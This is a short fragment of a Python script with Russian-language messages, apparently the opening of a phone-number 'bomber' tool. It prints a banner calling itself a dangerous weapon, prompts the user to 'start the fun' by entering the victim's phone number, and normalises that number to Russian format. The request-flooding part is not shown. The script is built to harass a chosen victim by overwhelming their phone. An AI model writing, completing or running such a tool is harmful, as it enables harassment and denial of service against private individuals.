import requests
import  random, datetime, sys, time, os
...
< P.S : Наш софт не рекомендуется выкладывать куда либо еще.
 Это может привести к беспорядку.
 Hаш софт слишком мощный, не стоит давать всем опасное оружие.
 
<[Вводить номер без тире]
-----------------------------------------------
...
''')
print(logo)
_phone = input('Начинай веселье, вводи номер жертвы:7##########==> ')
if _phone[0] == '+':
	_phone = _phone[1:]
if _phone[0] == '8':
	_phone = '7'+_phone[1:]
